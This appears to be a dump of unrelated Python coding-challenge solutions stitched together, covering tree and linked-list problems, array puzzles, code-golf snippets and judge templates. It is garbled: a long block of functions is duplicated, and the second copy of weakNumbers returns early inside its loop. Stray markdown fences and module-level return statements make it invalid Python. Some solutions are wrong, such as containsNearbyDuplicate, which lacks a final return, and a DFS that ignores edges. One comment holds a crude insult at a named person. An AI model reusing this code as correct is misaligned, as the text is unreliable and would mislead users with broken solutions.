# If you are given two binary trees and a node find the corrosponding node in another tree
#   1
#  / \
# 2   3
#    / \
#   4*  5


class Node:
    def __init__(self, val):
        self.val = val
        self.left = None
        self.right = None

    def __str__(self):
        return str(self.val)


class Solution:
    def findNode(self, a, b, node):
        if a == node:
            return b
        if a.left and b.left:
            found = self.findNode(a.left, b.left, node)
            if found:
                return found
        if a.right and b.right:
            found = self.findNode(a.right, b.right, node)
            if found:
                return found
        return None

    def findNodeIterative(self, a, b, node):

        stack = [(a, b)]
        while len(stack):
            (a, b) = stack.pop()

            if a == node:
                return b
            if a.left and b.left:
                stack.append((a.left, b.left))
            if a.right and b.right:
                stack.append((a.right, b.right))
        return None


if __name__ == "__main__":
    a = Node(1)
    a.left = Node(2)
    a.right = Node(3)
    a.right.left = Node(4)
    a.right.right = Node(5)

    b = Node(1)
    b.left = Node(2)
    b.right = Node(3)
    b.right.left = Node(4)
    b.right.right = Node(5)

    print(Solution().findNodeIterative(a, b, a.right.left))

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the closestNumbers function below.
def closestNumbers(arr):
    arr = sorted(arr)
    mindif = math.inf
    res = []
    for i in range(1, len(arr)):
        if (abs(arr[i - 1] - arr[i])) < mindif:
            res.clear()
            res.append(arr[i - 1])
            res.append(arr[i])
            mindif = abs(arr[i - 1] - arr[i])
        elif abs(arr[i - 1] - arr[i]) == mindif:
            res.append(arr[i - 1])
            res.append(arr[i])
    return res


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    arr = list(map(int, input().rstrip().split()))

    result = closestNumbers(arr)

    fptr.write(" ".join(map(str, result)))
    fptr.write("\n")

    fptr.close()

from sys import stdin, stdout


def coinFlip(I, N, Q):
    if N % 2 == 0:
        return N // 2
    else:
        if I == 1:
            if Q == 1:
                return N // 2
            else:
                return (N // 2) + 1
        else:
            if Q == 1:
                return (N // 2) + 1
            else:
                return N // 2


for _ in range(int(stdin.readline())):
    G = int(stdin.readline())
    for _ in range(G):
        I, N, Q = map(int, input().split())
        stdout.write(str(coinFlip(I, N, Q)) + "\n")

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def compare_lists(llist1, llist2):
    while llist1 and llist2:
        if llist1.data == llist2.data:
            llist1 = llist1.next
            llist2 = llist2.next
            continue
        else:
            return 0
    if not llist1 and not llist2:
        return 1
    return 0

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the compareTriplets function below.
def compareTriplets(a, b):
    pa = 0
    pb = 0
    x = 0
    while x < len(a):
        if a[x] > b[x]:
            pa += 1
        elif b[x] > a[x]:
            pb += 1
        else:
            x += 1
            continue
        x += 1
    return pa, pb


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    a = list(map(int, input().rstrip().split()))

    b = list(map(int, input().rstrip().split()))

    result = compareTriplets(a, b)

    fptr.write(" ".join(map(str, result)))
    fptr.write("\n")

    fptr.close()

# def fractionComparison(a, b):
#     d = a[0] / a[1]
#     f = b[0] / b[1]
#     if d < f:
#         return "<"
#     elif d > f:
#         return ">"
#     else:
#         return "="

(a, b), (c, d) = eval(dir()[0])
r = (a * d) / (b * c)
return "<" if r < 1 else ">" if r > 1 else "="

# 72 chars

# Nique toi Sylvere

L, = eval(dir()[0])
s = 0


while len(L) > 1:
    L = (
        numpy.add(L[:-1:2], L[1::2])
        if s % 2 == 0
        else numpy.multiply(L[:-1:2], L[1::2])
    )
    s += 1

return L[0]

class Solution:
    def maxArea(self, height: List[int]) -> int:
        i = 0
        j = len(height) - 1
        maxarea = 0
        while i != j:
            a = (j - i) * (min(height[i], height[j]))
            if a > maxarea:
                maxarea = a
            if height[i] > height[j]:
                j -= 1
            else:
                i += 1
        return maxarea

class Solution:
    def containsDuplicate(self, nums: List[int]) -> bool:
        return not len(nums) == len(set(nums))

# Given an array of integers and an integer k, find out whether there are two distinct indices
# i and j in the array such that nums[i] = nums[j] and the absolute difference between i and j is at most k.
#
# Example 1:
#
# Input: nums = [1,2,3,1], k = 3
# Output: true
# Example 2:
#
# Input: nums = [1,0,1,1], k = 1
# Output: true
# Example 3:
#
# Input: nums = [1,2,3,1,2,3], k = 2
# Output: false


class Solution:
    def containsNearbyDuplicate(self, nums, k):
        dict = {}

        for idx, num in enumerate(nums):
            if num in dict:
                if abs(dict[num] - idx) <= k:
                    return True
                elif abs(dict[num] - idx) > k:
                    dict[num] = idx

            else:
                dict[num] = idx

class Solution:
    def findMaxLength(self, nums: List[int]) -> int:
        dic = {0: -1}
        ps = 0
        max_length = 0
        for idx, number in enumerate(nums):
            if number:
                ps += 1
            else:
                ps -= 1
            if ps in dic:
                max_length = max(max_length, idx - dic[ps])
            else:
                dic[ps] = idx
        return max_length
```

````py
Given a binary array, find the maximum length of a contiguous subarray with equal number of 0 and 1.```


```py


def findMaxLength(nums):
    d = {}
    subarr, count = 0, 0
    for i, v in enumerate(nums):
        count += 2 * v - 1
        if count == 0:
            subarr = i + 1
        if count in d:
            subarr = max(subarr, i - d[count])
        else:
            d[count] = i
    return subarr


print(findMaxLength([0, 1, 1, 0, 1, 1, 1, 0]))

# Given an array where elements are sorted in ascending order, convert it to a height balanced BST.
#
# For this problem, a height-balanced binary tree is defined as a binary tree in which the depth
# of the two subtrees of every node never differ by more than 1.
#
# Example:
#
# Given the sorted array: [-10,-3,0,5,9],
#
# One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST:
#
#       0
#      / \
#    -3   9
#    /   /
#  -10  5


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def sortedArrayToBST(self, nums):
        def helper(left, right):
            if left <= right:
                mid = left + ((right - left) // 2)

                newnode = TreeNode(nums[mid])

                newnode.left = helper(left, mid - 1)
                newnode.right = helper(mid + 1, right)

                return newnode

        return helper(0, len(nums) - 1)

def maxMultiple(divisor, bound):
    for num in range(bound, 1, -1):
        if num % divisor == 0:
            return num
    return 0

def lateRide(n):
    hours = n // 60
    minutes = n % 60
    return (hours // 10) + (hours % 10) + (minutes // 10) + (minutes % 10)

def phoneCall(min1, min2_10, min11, s):
    if s < min1:
        return 0
    if s == min1:
        return 1
    if s <= min1 + (min2_10 * 9):
        s -= min1
        return (s // min2_10) + 1
    s -= min1
    s -= min2_10 * 9
    return (s // min11) + 10

def knapsackLight(value1, weight1, value2, weight2, maxW):
    if weight1 + weight2 <= maxW:
        return value1 + value2
    if weight1 <= maxW and weight2 <= maxW:
        return max(value1, value2)
    if weight1 <= maxW:
        return value1
    if weight2 <= maxW:
        return value2
    return 0

def tennisSet(score1, score2):
    if max(score1, score2) == 6 and min(score1, score2) < 5:
        return True
    if 5 <= min(score1, score2) <= 6 and max(score1, score2) == 7:
        return True
    return False

def metroCard(lastNumberOfDays):
    if lastNumberOfDays == 30 or lastNumberOfDays == 28:
        return [31]
    return [28, 30, 31]

def arrayPacking(a):
    binary_array = [bin(num)[2:].rjust(8, "0") for num in a]
    out_string = "".join(binary_array[::-1])
    return int(out_string, 2)

def rangeBitCount(a, b):
    array = list(range(a, b + 1))
    binary_array = [bin(num) for num in array]
    count_array = [binary.count("1") for binary in binary_array]
    return sum(count_array)

def leastFactorial(n):
    factorial = 1
    index = 1
    while factorial < n:
        index += 1
        factorial *= index
    return factorial

def countSumOfTwoRepresentations2(n, l, r):
    count = 0
    a = max(n - r, l)
    b = n - a
    while a <= r and a <= b:
        count += 1
        a += 1
        b -= 1
    return count

def magicalWell(a, b, n):
    total = 0
    for i in range(n):
        total += a * b
        a += 1
        b += 1
    return total

def lineUp(commands):
    count = 0
    smart_student = 0
    dumb_student = 0
    for command in commands:
        if command == "L":
            smart_student = (smart_student - 1) % 4
            dumb_student = (dumb_student + 1) % 4
        elif command == "R":
            smart_student = (smart_student + 1) % 4
            dumb_student = (dumb_student - 1) % 4
        elif command == "A":
            smart_student = (smart_student + 2) % 4
            dumb_student = (dumb_student + 2) % 4

        if smart_student == dumb_student:
            count += 1
    return count

def additionWithoutCarrying(param1, param2):
    # Convert numbers to strings
    str1 = str(param1)
    str2 = str(param2)
    # Pad both to the same length with zeroes (to the left of the numbers)
    length = max(len(str2), len(str1))
    str1 = str1.rjust(length, "0")
    str2 = str2.rjust(length, "0")
    output = []
    for num1, num2 in zip(str1, str2):
        result = str(int(num1) + int(num2))[-1]
        output.append(result)
    return int("".join(output))

def appleBoxes(k):
    red = 0
    yellow = 0
    for i in range(1, k + 1, 2):
        yellow += i * i
    for i in range(2, k + 1, 2):
        red += i * i

    return red - yellow

def increaseNumberRoundness(n):
    string = str(n)
    # Check for immediate rejection
    if "0" not in string or len(string) < 2:
        return False
    # Since we know there's a 0, if it's not on
    # the left, then we know to accept
    if string[-1] != "0":
        return True
    # If there is only one 0, it must be at the end, so reject.
    if string.count("0") == 1:
        return False
    # If there are any numbers between the first 0
    # and the end of the string, then accept.
    first_zero = string.find("0")
    zero_sandwich = string[first_zero:]
    return zero_sandwich.count("0") != len(zero_sandwich)

def rounders(value):
    length = len(str(value))
    magnitude = length - 1
    for i in range(length - 1):
        value = int((value / 10) + 0.5)
    return value * (10 ** magnitude)

def candles(candlesNumber, makeNew):
    totalBurned = 0
    leftovers = 0
    while candlesNumber > 0:
        totalBurned += candlesNumber
        leftovers += candlesNumber
        candlesNumber = 0
        candlesNumber = leftovers // makeNew
        leftovers = leftovers % makeNew
    return totalBurned

def countBlackCells(n, m):
    gcd = find_gcd(n, m)
    line_cells = n + m - gcd
    line_corner_cells = (gcd - 1) * 2
    return line_cells + line_corner_cells


def find_gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a

def arrayReplace(inputArray, elemToReplace, substitutionElem):
    output = [
        elem if elem != elemToReplace else substitutionElem for elem in inputArray
    ]
    return output

def firstReverseTry(arr):
    if len(arr) < 2:
        return arr
    if len(arr) < 4:
        return arr[::-1]
    return arr[-1:] + arr[1:-1] + arr[:1]

def isSmooth(arr):
    if arr[0] != arr[-1]:
        return False
    if len(arr) % 2 == 0:
        middle = arr[len(arr) // 2] + arr[(len(arr) // 2) - 1]
    else:
        middle = arr[len(arr) // 2]
    return arr[0] == middle

def replaceMiddle(arr):
    if len(arr) % 2 != 0:
        return arr
    right_middle = len(arr) // 2
    middle_value = arr[right_middle] + arr[right_middle - 1]
    return arr[: right_middle - 1] + [middle_value] + arr[right_middle + 1 :]

def makeArrayConsecutive2(statues):
    count = 0
    for i in range(min(statues), max(statues)):
        if i not in statues:
            count += 1
    return count

def isPower(n):
    if n == 1:
        return True

    a = 2
    b = 2
    while a ** 2 <= n:
        while a ** b <= n:
            if a ** b == n:
                return True
            b += 1
        b = 2
        a += 1
    return False

def isSumOfConsecutive2(n):
    count = 0
    right = 2
    arr = [1, 2]
    while right <= (n // 2) + 1:
        total = sum(arr)
        if total == n:
            count += 1
            del arr[0]
        elif total < n:
            right += 1
            arr.append(right)
        elif total > n:
            del arr[0]
    return count

def squareDigitsSequence(a0):
    sequence = [a0]
    while sequence[-1] not in sequence[:-1]:
        next_value = 0
        for digit in str(sequence[-1]):
            next_value += int(digit) ** 2
        sequence.append(next_value)
    return len(sequence)

def pagesNumberingWithInk(current, numberOfDigits):
    numberOfDigits -= len(str(current))
    next_digits = len(str(current + 1))
    while numberOfDigits >= next_digits:
        current += 1
        numberOfDigits -= next_digits
        next_digits = len(str(current))
    return current

def comfortableNumbers(l, r):
    count = 0
    for a in range(l, r):
        for b in range(a + 1, r + 1):
            a_sum = sum(int(digit) for digit in str(a))
            b_sum = sum(int(digit) for digit in str(b))
            if b <= a + a_sum and a >= b - b_sum:
                count += 1
    return count

def weakNumbers(n):
    all_factors = [count_factors(num) for num in range(1, n + 1)]
    weaknesses = []
    for num, num_factors in enumerate(all_factors, 1):
        weakness = 0
        for factor in all_factors[:num]:
            if factor > num_factors:
                weakness += 1
        weaknesses.append(weakness)
    weakest = max(weaknesses)
    return [weakest, weaknesses.count(weakest)]


def count_factors(n):
    factors = 0
    for i in range(1, n + 1):
        if n % i == 0:
            factors += 1
    return factors


print(weakNumbers(500))

import math


def rectangleRotation(a, b):
    n = a / (2 ** 0.5)
    m = b / (2 ** 0.5)
    points = (math.floor(n) * math.floor(m)) + (math.ceil(n) * math.ceil(m))
    if math.floor(n) % 2 != math.floor(m) % 2:
        points -= 1
    return points


# rectangleRotation(6, 4)
print(rectangleRotation(8, 6))

def maxMultiple(divisor, bound):
    for num in range(bound, 1, -1):
        if num % divisor == 0:
            return num
    return 0

def lateRide(n):
    hours = n // 60
    minutes = n % 60
    return (hours // 10) + (hours % 10) + (minutes // 10) + (minutes % 10)

def phoneCall(min1, min2_10, min11, s):
    if s < min1:
        return 0
    if s == min1:
        return 1
    if s <= min1 + (min2_10 * 9):
        s -= min1
        return (s // min2_10) + 1
    s -= min1
    s -= min2_10 * 9
    return (s // min11) + 10

def knapsackLight(value1, weight1, value2, weight2, maxW):
    if weight1 + weight2 <= maxW:
        return value1 + value2
    if weight1 <= maxW and weight2 <= maxW:
        return max(value1, value2)
    if weight1 <= maxW:
        return value1
    if weight2 <= maxW:
        return value2
    return 0

def tennisSet(score1, score2):
    if max(score1, score2) == 6 and min(score1, score2) < 5:
        return True
    if 5 <= min(score1, score2) <= 6 and max(score1, score2) == 7:
        return True
    return False

def metroCard(lastNumberOfDays):
    if lastNumberOfDays == 30 or lastNumberOfDays == 28:
        return [31]
    return [28, 30, 31]

def arrayPacking(a):
    binary_array = [bin(num)[2:].rjust(8, "0") for num in a]
    out_string = "".join(binary_array[::-1])
    return int(out_string, 2)

def rangeBitCount(a, b):
    array = list(range(a, b + 1))
    binary_array = [bin(num) for num in array]
    count_array = [binary.count("1") for binary in binary_array]
    return sum(count_array)

def leastFactorial(n):
    factorial = 1
    index = 1
    while factorial < n:
        index += 1
        factorial *= index
    return factorial

def countSumOfTwoRepresentations2(n, l, r):
    count = 0
    a = max(n - r, l)
    b = n - a
    while a <= r and a <= b:
        count += 1
        a += 1
        b -= 1
    return count

def magicalWell(a, b, n):
    total = 0
    for i in range(n):
        total += a * b
        a += 1
        b += 1
    return total

def lineUp(commands):
    count = 0
    smart_student = 0
    dumb_student = 0
    for command in commands:
        if command == "L":
            smart_student = (smart_student - 1) % 4
            dumb_student = (dumb_student + 1) % 4
        elif command == "R":
            smart_student = (smart_student + 1) % 4
            dumb_student = (dumb_student - 1) % 4
        elif command == "A":
            smart_student = (smart_student + 2) % 4
            dumb_student = (dumb_student + 2) % 4

        if smart_student == dumb_student:
            count += 1
    return count

def additionWithoutCarrying(param1, param2):
    # Convert numbers to strings
    str1 = str(param1)
    str2 = str(param2)
    # Pad both to the same length with zeroes (to the left of the numbers)
    length = max(len(str2), len(str1))
    str1 = str1.rjust(length, "0")
    str2 = str2.rjust(length, "0")
    output = []
    for num1, num2 in zip(str1, str2):
        result = str(int(num1) + int(num2))[-1]
        output.append(result)
    return int("".join(output))

def appleBoxes(k):
    red = 0
    yellow = 0
    for i in range(1, k + 1, 2):
        yellow += i * i
    for i in range(2, k + 1, 2):
        red += i * i

    return red - yellow

def increaseNumberRoundness(n):
    string = str(n)
    # Check for immediate rejection
    if "0" not in string or len(string) < 2:
        return False
    # Since we know there's a 0, if it's not on
    # the left, then we know to accept
    if string[-1] != "0":
        return True
    # If there is only one 0, it must be at the end, so reject.
    if string.count("0") == 1:
        return False
    # If there are any numbers between the first 0
    # and the end of the string, then accept.
    first_zero = string.find("0")
    zero_sandwich = string[first_zero:]
    return zero_sandwich.count("0") != len(zero_sandwich)

def rounders(value):
    length = len(str(value))
    magnitude = length - 1
    for i in range(length - 1):
        value = int((value / 10) + 0.5)
    return value * (10 ** magnitude)

def candles(candlesNumber, makeNew):
    totalBurned = 0
    leftovers = 0
    while candlesNumber > 0:
        totalBurned += candlesNumber
        leftovers += candlesNumber
        candlesNumber = 0
        candlesNumber = leftovers // makeNew
        leftovers = leftovers % makeNew
    return totalBurned

def countBlackCells(n, m):
    gcd = find_gcd(n, m)
    line_cells = n + m - gcd
    line_corner_cells = (gcd - 1) * 2
    return line_cells + line_corner_cells


def find_gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a

def arrayReplace(inputArray, elemToReplace, substitutionElem):
    output = [
        elem if elem != elemToReplace else substitutionElem for elem in inputArray
    ]
    return output

def firstReverseTry(arr):
    if len(arr) < 2:
        return arr
    if len(arr) < 4:
        return arr[::-1]
    return arr[-1:] + arr[1:-1] + arr[:1]

def isSmooth(arr):
    if arr[0] != arr[-1]:
        return False
    if len(arr) % 2 == 0:
        middle = arr[len(arr) // 2] + arr[(len(arr) // 2) - 1]
    else:
        middle = arr[len(arr) // 2]
    return arr[0] == middle

def replaceMiddle(arr):
    if len(arr) % 2 != 0:
        return arr
    right_middle = len(arr) // 2
    middle_value = arr[right_middle] + arr[right_middle - 1]
    return arr[: right_middle - 1] + [middle_value] + arr[right_middle + 1 :]

def makeArrayConsecutive2(statues):
    count = 0
    for i in range(min(statues), max(statues)):
        if i not in statues:
            count += 1
    return count

def isPower(n):
    if n == 1:
        return True

    a = 2
    b = 2
    while a ** 2 <= n:
        while a ** b <= n:
            if a ** b == n:
                return True
            b += 1
        b = 2
        a += 1
    return False

def isSumOfConsecutive2(n):
    count = 0
    right = 2
    arr = [1, 2]
    while right <= (n // 2) + 1:
        total = sum(arr)
        if total == n:
            count += 1
            del arr[0]
        elif total < n:
            right += 1
            arr.append(right)
        elif total > n:
            del arr[0]
    return count

def squareDigitsSequence(a0):
    sequence = [a0]
    while sequence[-1] not in sequence[:-1]:
        next_value = 0
        for digit in str(sequence[-1]):
            next_value += int(digit) ** 2
        sequence.append(next_value)
    return len(sequence)

def pagesNumberingWithInk(current, numberOfDigits):
    numberOfDigits -= len(str(current))
    next_digits = len(str(current + 1))
    while numberOfDigits >= next_digits:
        current += 1
        numberOfDigits -= next_digits
        next_digits = len(str(current))
    return current

def comfortableNumbers(l, r):
    count = 0
    for a in range(l, r):
        for b in range(a + 1, r + 1):
            a_sum = sum(int(digit) for digit in str(a))
            b_sum = sum(int(digit) for digit in str(b))
            if b <= a + a_sum and a >= b - b_sum:
                count += 1
    return count

def weakNumbers(n):
    all_factors = [count_factors(num) for num in range(1, n + 1)]
    weaknesses = []
    for num, num_factors in enumerate(all_factors, 1):
        weakness = 0
        for factor in all_factors[:num]:
            if factor > num_factors:
                weakness += 1
        weaknesses.append(weakness)
        weakest = max(weaknesses)
        return [weakest, weaknesses.count(weakest)]


def count_factors(n):
    factors = 0
    for i in range(1, n + 1):
        if n % i == 0:
            factors += 1
    return factors


print(weakNumbers(500))

import math


def rectangleRotation(a, b):
    n = a / (2 ** 0.5)
    m = b / (2 ** 0.5)
    points = (math.floor(n) * math.floor(m)) + (math.ceil(n) * math.ceil(m))
    if math.floor(n) % 2 != math.floor(m) % 2:
        points -= 1
    return points


# rectangleRotation(6, 4)
print(rectangleRotation(8, 6))

# Input:
# S = "geeksforgeeks", N = 2
# Output: 4
# Explanation: 'g', 'e', 'k' and 's' have
# 2 occurrences.


def CountChar(String, Occurance):
    STROCR = {}
    RESULT = []
    for i in range(len(String)):
        if String[i] in STROCR.keys():
            STROCR[String[i]] += 1
        else:
            STROCR[String[i]] = 1
    for j in STROCR.keys():
        if STROCR[j] == Occurance:
            RESULT.append(j)
        elif STROCR[j] > Occurance:
            RESULT.append(j)
        else:
            pass
    print(RESULT)


String = "geeksforgeeks"
Occurance = 2
CountChar(String, Occurance)

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def countNodes(self, root: TreeNode) -> int:
        if not root:
            return 0
        self.c = 0

        def count(node):
            if node:
                if node.left:
                    count(node.left)
                if node.right:
                    count(node.right)
                self.c += 1
            return self.c

        count(root)
        return self.c

# Input:
# S = "geeksforgeeks", N = 2
# Output: 4
# Explanation: 'g', 'e', 'k' and 's' have
# 2 occurrences.


def CountChar(String, Occurance):
    STROCR = {}
    RESULT = []
    for i in range(len(String)):
        if String[i] in STROCR.keys():
            STROCR[String[i]] += 1
        else:
            STROCR[String[i]] = 1
    for j in STROCR.keys():
        if STROCR[j] == Occurance:
            RESULT.append(j)
        elif STROCR[j] > Occurance:
            RESULT.append(j)
        else:
            pass
    print(RESULT)


String = "geeksforgeeks"
Occurance = 2
CountChar(String, Occurance)

class Solution:
    def countBits(self, num: int) -> List[int]:
        ans = [0]
        offset = 1
        for i in range(1, num + 1):
            if offset * 2 == i:
                offset = i
            ans.append(ans[i - offset] + 1)
        return ans

class Solution:
    def countElements(self, arr: List[int]) -> int:
        s = set()
        s = set(arr)
        c = 0
        for i in range(len(arr)):
            if arr[i] + 1 in s:
                c += 1
        return c

#!/bin/python3
import sys

#
# Complete the 'countingValleys' function below.
#
# The function is expected to return an INTEGER.
# The function accepts following parameters:
#  1. INTEGER steps
#  2. STRING path
#


def countingValleys(steps, path):
    # Write your code here
    path = list(path)
    sealevel = valley = 0
    for paths in path:

        if paths == "U":
            sealevel += 1
        else:
            sealevel -= 1

        if paths == "U" and sealevel == 0:
            valley += 1
    return valley


path = "UDDDUDUU"
steps = 8
print(countingValleys(steps, path))

number = int(input())


counter = 0
while number > 0:
    number = number // 10
    print(number)
    counter += 1
print("number of digits :", counter)

from collections import deque


class Solution:
    def canFinish(self, numCourses, prerequisites) -> bool:
        adjList = [[] for _ in range(numCourses)]
        inDegree = [0 for _ in range(numCourses)]
        queue = deque()
        visited = 0
        for i in range(len(prerequisites)):
            adjList[prerequisites[i][0]].append(prerequisites[i][1])
        for i in range(numCourses):
            for j in adjList[i]:
                inDegree[j] += 1
        for i in range(len(inDegree)):
            if inDegree[i] == 0:
                queue.append(i)
        while queue:
            el = queue.popleft()
            for i in adjList[el]:
                inDegree[i] -= 1
                if inDegree[i] == 0:
                    queue.append(i)
            visited += 1
        if visited == numCourses:
            return True
        else:
            return False

for _ in range(int(input())):
    N, K, X, Y = map(int, input().split())
    z = X
    f = 0
    while True:
        X = (X + K) % N
        if Y == X:
            f = 1
            break
        elif X == z:
            break
    if f == 1:
        print("YES")
    else:
        print("NO")

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def has_cycle(head):
    if not head:
        return 0
    fast = slow = head
    while fast and fast.next:
        fast = fast.next.next
        slow = slow.next
        if fast == slow:
            return 1
    return 0

# def insertDashes(s):
#     return "-".join(s).replace("- -", " ")
# 55

# insertDashes = lambda s: "-".join(s).replace("- -", " ")
# 51

# return "-".join(*eval(dir()[0])).replace("- -", " ")
# 50

# return re.sub("- -", " ", "-".join(*eval(dir()[0])))
# 49

# insertDashes = lambda s: re.sub('\B', '-', s)
# 39

return re.sub("\B", "-", *eval(dir()[0]))
# 38

# Python program to Find day of
# the week for a given date
import calendar  # module of python to provide useful fucntions related to calendar
import datetime  # module of python to get the date and time


def findDay(date):
    born = datetime.datetime.strptime(
        date, "%d %m %Y"
    ).weekday()  # this statement returns an integer corresponding to the day of the week
    return calendar.day_name[
        born
    ]  # this statement returns the corresponding day name to the integer generated in the previous statement


# Driver program
date = input()  # this is the input date
print(
    findDay(date)
)  # here we print the final output after calling the fucntion findday

# __author__ = Gautam Kumar Jaiswal

from __future__ import print_function

# Python code to demonstrate working of
# extend(), extendleft(), rotate(), reverse()

# importing "collections" for deque operations
import collections

# initializing deque
de = collections.deque([1, 2, 3])

# using extend() to add numbers to right end
# adds 4,5,6 to right end
de.extend([4, 5, 6])

# printing modified deque
print("The deque after extending deque at end is : ")
print(de)

# using extendleft() to add numbers to left end
# adds 7,8,9 to right end
de.extendleft([7, 8, 9])

# printing modified deque
print("The deque after extending deque at beginning is : ")
print(de)

# using rotate() to rotate the deque
# rotates by 3 to left
de.rotate(-3)

# printing modified deque
print("The deque after rotating deque is : ")
print(de)

# using reverse() to reverse the deque
de.reverse()

# printing modified deque
print("The deque after reversing deque is : ")
print(de)

def digitDegree(n):
    degree = 0
    while 10 <= n:
        num = str(n)
        n = sum(int(i) for i in num)
        degree += 1
    return degree

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def deleteNode(head, position):
    if position == 0:
        return head.next
    temp = head
    ptr = 1
    while ptr != position:
        temp = temp.next
        ptr += 1
    temp.next = temp.next.next
    return head

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def removeDuplicates(head):
    dummy = head
    while dummy and dummy.next:
        if dummy.data == dummy.next.data:
            dummy.next = dummy.next.next
            continue
        dummy = dummy.next
    return head

class Solution:
    def minDeletionSize(self, A: List[str]) -> int:
        s = 0
        for col in zip(*A):
            if any(col[i] > col[i + 1] for i in range(len(col) - 1)):
                s += 1
        return s

class Solution:
    def deleteNode(self, root, key):
        if not root:
            return
        if key > root.val:
            root.right = self.deleteNode(root.right, key)
        elif key < root.val:
            root.left = self.deleteNode(root.left, key)
        else:
            if not root.left:
                return root.right
            else:
                temp = root.left
                while temp.right:
                    temp = temp.right
                root.val = temp.val
                root.left = self.deleteNode(root.left, temp.val)
        return root

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def deleteNode(self, node):
        node.val = node.next.val
        node.next = node.next.next

class ListNode:
    def __init__(self, val):
        self.val = val
        self.next = None


class Solution:
    def remove(self, head, val):
        sentinel = ListNode(0)
        sentinel.next = head
        prev, curr = sentinel, head

        while curr:
            if curr.val == val:
                prev.next = curr.next
            else:
                prev = curr
            curr = curr.next
        return sentinel.next


if __name__ == "__main__":
    arr = [1, 2, 6, 3, 5, 6]
    node = ListNode(arr[0])
    newnode = node
    for i in arr[1:]:
        newnode.next = ListNode(i)
        newnode = newnode.next
    newnode = Solution().remove(node, 6)
    while node:
        print(node.val)
        node = node.next

# Write a function to delete a node (except the tail) in a singly linked list,
# given only access to that node.
#
# Given linked list -- head = [4,5,1,9], which looks like following:
#
# 4 - > 5 - > 1 - > 9
#
# Input: head = [4,5,1,9], node = 5
# Output: [4,1,9]
# Explanation: You are given the second node with value 5, the linked list should
# become 4 -> 1 -> 9 after calling your function.
#
# Input: head = [4,5,1,9], node = 1
# Output: [4,5,9]
# Explanation: You are given the third node with value 1, the linked list should
# become 4 -> 5 -> 9 after calling your function.
#
# The linked list will have at least two elements.
# All of the nodes' values will be unique.
# The given node will not be the tail and it will always be a valid node of the linked list.
# Do not return anything from your function


class ListNode:
    def __init__(self, val):
        self.val = val
        self.next = None


class Solution:
    def delete(self, node):
        node.val = node.next.val
        node.next = node.next.next


if __name__ == "__main__":
    node = ListNode(4)
    node.next = ListNode(5)
    node.next.next = ListNode(1)
    node.next.next.next = ListNode(9)
    test = node
    while test:
        print(test.val)
        test = test.next
    print("after deleting")
    Solution().delete(node.next)
    while node:
        print(node.val)
        node = node.next

class Department:
    def __init__(self, name, products=[]):
        # this is a string
        self.name = name
        # this takes in a list of products (has_a) / (has_many)
        self.products = products

    def __str__(self):
        output = f"  {self.name}\n"
        if len(self.products) < 1:
            output = f"No products found in {self.name}"

        for product in self.products:
            output += f"\t{product}\n"

        return output

# Author: OMKAR PATHAK
from __future__ import print_function


class Graph:
    def __init__(self):
        self.vertex = {}

    # for printing the Graph vertexes
    def printGraph(self):
        print(self.vertex)
        for i in self.vertex.keys():
            print(i, " -> ", " -> ".join([str(j) for j in self.vertex[i]]))

    # for adding the edge beween two vertexes
    def addEdge(self, fromVertex, toVertex):
        # check if vertex is already present,
        if fromVertex in self.vertex.keys():
            self.vertex[fromVertex].append(toVertex)
        else:
            # else make a new vertex
            self.vertex[fromVertex] = [toVertex]

    def DFS(self):
        # visited array for storing already visited nodes
        visited = [False] * len(self.vertex)

        # call the recursive helper function
        for i in range(len(self.vertex)):
            if visited[i] == False:
                self.DFSRec(i, visited)

    def DFSRec(self, startVertex, visited):
        # mark start vertex as visited
        visited[startVertex] = True

        print(startVertex, end=" ")

        # Recur for all the vertexes that are adjacent to this node
        for i in self.vertex.keys():
            if visited[i] == False:
                self.DFSRec(i, visited)


if __name__ == "__main__":
    g = Graph()
    g.addEdge(0, 1)
    g.addEdge(0, 2)
    g.addEdge(1, 2)
    g.addEdge(2, 0)
    g.addEdge(2, 3)
    g.addEdge(3, 3)

    g.printGraph()
    print("DFS:")
    g.DFS()

    # OUTPUT:
    # 0  ->  1 -> 2
    # 1  ->  2
    # 2  ->  0 -> 3
    # 3  ->  3
    # DFS:
    #  0 1 2 3

class MyCircularQueue:
    def __init__(self, k: int):
        self.size = 0
        self.maxsize = k
        self.cq = [0] * k
        self.front = self.rear = -1

    def enQueue(self, value: int) -> bool:
        if self.size == self.maxsize:
            return False
        else:
            if self.rear == -1:
                self.rear = self.front = 0
            else:
                self.rear = (self.rear + 1) % self.maxsize
            self.cq[self.rear] = value
            self.size += 1
            return True

    def deQueue(self) -> bool:
        if self.size == 0:
            return False
        if self.front == self.rear:
            self.front = self.rear = -1
        else:
            self.front = (self.front + 1) % self.maxsize
        self.size -= 1
        return True

    def Front(self) -> int:
        return self.cq[self.front] if self.size != 0 else -1

    def Rear(self) -> int:
        return self.cq[self.rear] if self.size != 0 else -1

    def isEmpty(self) -> bool:
        return self.size == 0

    def isFull(self) -> bool:
        return self.size == self.maxsize


# Your MyCircularQueue object will be instantiated and called as such:
# obj = MyCircularQueue(k)
# param_1 = obj.enQueue(value)
# param_2 = obj.deQueue()
# param_3 = obj.Front()
# param_4 = obj.Rear()
# param_5 = obj.isEmpty()
# param_6 = obj.isFull()

# Design a Phone Directory which supports the following operations:
#
# get: Provide a number which is not assigned to anyone.
# check: Check if a number is available or not.
# release: Recycle or release a number.
#
# Example:
#
# // Init a phone directory containing a total of 3 numbers: 0, 1, and 2.
# PhoneDirectory directory = new PhoneDirectory(3);
#
